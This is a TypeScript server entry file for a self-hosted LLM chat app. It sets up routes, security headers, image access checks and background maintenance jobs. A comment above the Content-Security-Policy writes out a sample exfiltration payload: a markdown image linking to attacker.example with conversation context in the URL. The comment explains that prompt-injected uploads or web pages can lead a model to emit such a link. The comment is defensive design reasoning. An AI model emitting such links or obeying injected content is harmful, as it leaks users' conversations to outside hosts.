// Prefix all console output with ISO timestamp
;(function () {
  const ts = () => new Date().toISOString().replace('T', ' ').slice(0, 19)
  const _log = console.log.bind(console)
  const _warn = console.warn.bind(console)
  const _error = console.error.bind(console)
  console.log = (...a) => _log(`[${ts()}]`, ...a)
  console.warn = (...a) => _warn(`[${ts()}]`, ...a)
  console.error = (...a) => _error(`[${ts()}]`, ...a)
})()

import { Hono } from 'hono'
import { authMiddleware, type AppEnv } from './middleware/auth.ts'
import { cors } from 'hono/cors'
import { secureHeaders } from 'hono/secure-headers'
import { logger } from 'hono/logger'
import { serveStatic } from 'hono/bun'
import { chatRouter } from './routes/chat.ts'
import { filesRouter } from './routes/files.ts'
import { historyRouter } from './routes/history.ts'
import { spacesRouter } from './routes/spaces.ts'
import { authRouter } from './routes/auth.ts'
import { adminRouter } from './routes/admin.ts'
import { usersRouter } from './routes/users.ts'
import { memoriesRouter } from './routes/memories.ts'
import { imagesRouter } from './routes/images.ts'
import { templatesRouter } from './routes/templates.ts'
import { monitorsRouter } from './routes/monitors.ts'
import { feedsRouter } from './routes/feeds.ts'
import { db, messages, sqlite, getAppSetting, setAppSetting } from './lib/db.ts'
import { runDream } from './lib/memory.ts'
import { runDueMonitors } from './lib/monitor-runner.ts'
import { validateConfig, checkEmbeddingDimensions, checkAttachmentBudget } from './lib/config-check.ts'
import { purgeOrphanVectors } from './lib/vector-cleanup.ts'
import { reindexNotes } from './lib/files/notes.ts'
import { reembedMissingVectors } from './lib/reembed.ts'
import { EMBED_BATCH_CHARS, EMBED_MAX_INPUT_CHARS } from './lib/llm.ts'

import { IMAGE_API, IMAGE_STEPS, imageStorageDir, imageUrlsIn, purgeOrphanImages } from './lib/image-store.ts'

const app = new Hono<AppEnv>()

app.use('*', logger())
// HSTS is left to the proxy that terminates TLS.
app.use('*', secureHeaders({ xFrameOptions: 'DENY', referrerPolicy: 'strict-origin-when-cross-origin', strictTransportSecurity: false }))

/** The directive that matters is `img-src`.
 *
 *  An assistant answer containing `![](https://attacker.example/?d=<context>)` is rendered as a
 *  plain `<img src>` by the markdown renderer, so the browser fetches it the moment the answer
 *  appears: no tool call, nothing in the progress log, and `url-guard.ts` never involved — that
 *  guard is server-side and blocks the *inward* direction (SSRF). Restricting images to our own
 *  origin is the only thing that closes it, and a model can be talked into emitting such an image
 *  by content it reads (a poisoned upload or web page), not only by being maliciously trained.
 *
 *  Applied by the app rather than left to a reverse proxy so it also covers direct-port
 *  deployments, and so it can be regression-tested. Verified against the built client: the service
 *  worker registers from an external /registerSW.js (no inline script), KaTeX and
 *  react-syntax-highlighter need inline *styles* only, and nothing loads from a third-party origin.
 *  `unsafe-inline` for styles does not reopen the hole — CSS `url()` image loads are governed by
 *  img-src and @font-face by font-src. Dev is unaffected: Vite serves the page there. */
const DEFAULT_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "worker-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
].join('; ')

// Full replacement for deployments that legitimately load remote assets. Empty string disables.
const CSP = process.env.CONTENT_SECURITY_POLICY ?? DEFAULT_CSP
if (!CSP) {
  console.warn('[csp] Content-Security-Policy disabled — an answer containing a remote markdown image can silently send conversation content to that host.')
} else {
  // Set after next(), matching secureHeaders above: the response object exists by then.
  app.use('*', async (c, next) => {
    await next()
    c.res.headers.set('Content-Security-Policy', CSP)
  })
}

// The client is always same-origin (Hono serves it in production, Vite proxies /api in dev),
// so CORS is off unless a cross-origin caller is explicitly configured.
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN
if (ALLOWED_ORIGIN === '*') {
  console.warn('[cors] ALLOWED_ORIGIN=* allows any site to call this API. Set it to your own origin, or leave it unset for same-origin only.')
}
if (ALLOWED_ORIGIN) app.use('/api/*', cors({ origin: ALLOWED_ORIGIN, credentials: true }))

app.route('/api/auth', authRouter)
app.route('/api/chat', chatRouter)
app.route('/api/files', filesRouter)
app.route('/api/history', historyRouter)
app.route('/api/spaces', spacesRouter)
app.route('/api/spaces', memoriesRouter)
app.route('/api/admin', adminRouter)
app.route('/api/users', usersRouter)
app.route('/api/images', imagesRouter)
app.route('/api/templates', templatesRouter)
app.route('/api/monitors', monitorsRouter)
app.route('/api/feeds', feedsRouter)

// Serve generated images — auth required, users can only access their own
app.get('/images/:userId/:filename', authMiddleware, async (c) => {
  const requestingUserId = c.get('userId')
  const ownerUserId = c.req.param('userId')
  const filename = c.req.param('filename')
  if (!/^[\w-]+$/.test(ownerUserId)) return c.notFound()
  if (!/^[\w-]+\.png$/.test(filename)) return c.notFound()
  // Non-admins can only access their own images; return 404 to avoid leaking existence
  if (c.get('userRole') !== 'admin' && requestingUserId !== ownerUserId) return c.notFound()
  const dir = imageStorageDir()
  const file = Bun.file(`${dir}/${ownerUserId}/${filename}`)
  if (!await file.exists()) return c.notFound()
  const disposition = c.req.query('dl') ? `attachment; filename="${filename}"` : 'inline'
  return new Response(file, { headers: {
    'Content-Type': 'image/png',
    'Content-Disposition': disposition,
    'Cache-Control': 'private, max-age=31536000',
  }})
})

// Serve built client in production
app.use('*', serveStatic({ root: './dist/client' }))
app.get('*', serveStatic({ path: './dist/client/index.html' }))

const PORT = parseInt(process.env.PORT ?? '3000')
console.log(`queriocity listening on http://localhost:${PORT}`)
const _baseURL = process.env.BASE_URL
const _defaultProvider = process.env.BASE_PROVIDER ?? 'openai'
const _defaultBase = _baseURL ?? 'http://localhost:11434/api'
console.log(`  chat:   ${process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.CHAT_MODEL ?? 'llama3.2'}`)
console.log(`  small:  ${process.env.SMALL_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.SMALL_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.SMALL_MODEL ?? process.env.CHAT_MODEL ?? 'llama3.2'}`)
console.log(`  thinking: ${process.env.THINKING_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.THINKING_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.THINKING_MODEL ?? process.env.CHAT_MODEL ?? 'llama3.2'}`)
console.log(`  embed:  ${process.env.EMBED_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.EMBED_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.EMBED_MODEL ?? 'nomic-embed-text'}  dims=${process.env.EMBED_DIMENSIONS ?? '1536'}  ctx=${process.env.EMBED_CONTEXT_TOKENS ?? '1024'}tok → ${EMBED_BATCH_CHARS}c/request, ${EMBED_MAX_INPUT_CHARS}c/vector`)
console.log(`  searxng: ${process.env.SEARXNG_URL ?? 'http://localhost:4000'}`)
if (process.env.IMAGE_BASE_URL) {
  const imageDir = imageStorageDir()
  console.log(`  image:  ${process.env.IMAGE_BASE_URL}  api=${IMAGE_API}  model=${process.env.IMAGE_MODEL ?? 'default'}  steps=${IMAGE_STEPS.draft}/${IMAGE_STEPS.balanced}/${IMAGE_STEPS.high}  storage=${imageDir}`)
}

function shutdown() {
  try { sqlite.close() } catch {}
  process.exit(0)
}
process.on('SIGTERM', shutdown)
process.on('SIGINT', shutdown)

async function preflight() {
  const searxngUrl = process.env.SEARXNG_URL ?? 'http://localhost:4000'
  try {
    const res = await fetch(`${searxngUrl}/healthz`, { signal: AbortSignal.timeout(3000) })
    if (res.ok) console.log(`  [preflight] searxng OK`)
    else console.warn(`  [preflight] searxng returned ${res.status} — search may not work`)
  } catch {
    console.warn(`  [preflight] searxng unreachable at ${searxngUrl} — search will fail`)
  }

  const chatBase = process.env.CHAT_BASE_URL ?? process.env.BASE_URL ?? 'http://localhost:11434/api'
  try {
    const res = await fetch(chatBase, { signal: AbortSignal.timeout(3000) })
    if (res.status < 500) console.log(`  [preflight] chat LLM OK`)
    else console.warn(`  [preflight] chat LLM at ${chatBase} returned ${res.status}`)
  } catch {
    console.warn(`  [preflight] chat LLM unreachable at ${chatBase} — chat will fail`)
  }

  await checkEmbeddingDimensions()
  await checkAttachmentBudget()
}

validateConfig()

// Vectors whose owning row is gone are invisible in results (every search inner-joins the owner)
// but are still scanned on every query, and their meta rows keep the original text on disk. Swept
// here because the deletion paths that used to leak them are fixed, so existing databases carry
// debris that nothing else would ever remove.
purgeOrphanVectors()

// The filesystem counterpart. A generated PNG is written before the message that references it is
// saved, so a regenerate (which deletes the previous answer), an aborted turn or an ephemeral run
// each strand one with nothing left pointing at it — and unlike the vectors, nothing scans them,
// so they simply accumulate. Referenced URLs come from the messages themselves rather than a
// separate index, which is the only source that cannot drift.
sweepOrphanImages().catch(e => console.error('[image] orphan sweep failed:', e))

async function sweepOrphanImages(): Promise<void> {
  const rows = await db.select({ content: messages.content }).from(messages)
  await purgeOrphanImages(imageUrlsIn(rows.map(r => r.content)))
}

// Vectors are derived data; the text behind them is not. A changed EMBED_DIMENSIONS invalidates
// every vector and nothing else, so recovery is re-embedding what `*_chunk_meta` already holds —
// no re-chunking, and no resource deleted. Run in the background rather than on the startup path:
// a large corpus takes a while, and degraded retrieval is far better than a server that will not
// serve. reindexNotes covers the one case this cannot, a note whose chunk text was never written.
rebuildEmbeddings().catch(e => console.error('[reembed] failed:', e))

async function rebuildEmbeddings(): Promise<void> {
  await reembedMissingVectors()
  await reindexNotes()
}

preflight().catch(() => {})

setInterval(async () => {
  runDueMonitors().catch(e => console.error('[monitors] run failed:', e))

  const hour = parseInt(await getAppSetting('dream_hour', '-1'))
  if (hour < 0) return
  const now = new Date()
  if (now.getHours() !== hour) return
  const todayKey = now.toISOString().split('T')[0]
  const lastRun = await getAppSetting('dream_last_run', '')
  if (lastRun === todayKey) return
  await setAppSetting('dream_last_run', todayKey)
  console.log(`  [dream] starting nightly compaction`)
  runDream().catch(e => console.error('[dream] failed:', e))
}, 5 * 60 * 1000)

export default { port: PORT, fetch: app.fetch, idleTimeout: 255 }
